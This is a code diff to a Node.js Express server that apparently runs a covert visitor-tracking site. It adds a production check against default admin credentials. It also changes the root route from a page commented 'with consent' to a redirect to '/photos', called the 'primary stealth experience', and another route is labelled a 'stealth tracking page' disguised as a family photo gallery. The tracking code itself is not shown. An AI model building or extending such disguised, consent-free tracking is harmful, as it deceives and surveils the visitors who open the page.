@@ -7,11 +7,19 @@ const fs = require('fs').promises;
 const db = require('./database');
 
 const app = express();
+app.set('trust proxy', 1); // Enable trust proxy for Vercel/deployment platforms
 const PORT = process.env.PORT || 3000;
 
 // Admin credentials (CHANGE THESE IN PRODUCTION!)
 const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'admin';
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
+
+// Production security check
+if (process.env.NODE_ENV === 'production' && (!process.env.ADMIN_USERNAME || !process.env.ADMIN_PASSWORD)) {
+  console.error('❌ ADMIN_USERNAME and ADMIN_PASSWORD environment variables must be set in production!');
+  console.error('⚠️  Using default credentials in production is a major security risk.');
+  process.exit(1);
+}
 
 // Load configuration
 const CONFIG_FILE = path.join(__dirname, 'config.json');
@@ -77,9 +85,9 @@ const getClientIP = (req) => {
          'Unknown';
 };
 
-// Route: Serve the main page (with consent)
+// Route: Redirect root to the primary stealth experience
 app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+  res.redirect(302, '/photos');
 });
 
 // Route: Serve stealth tracking page (family photo gallery)
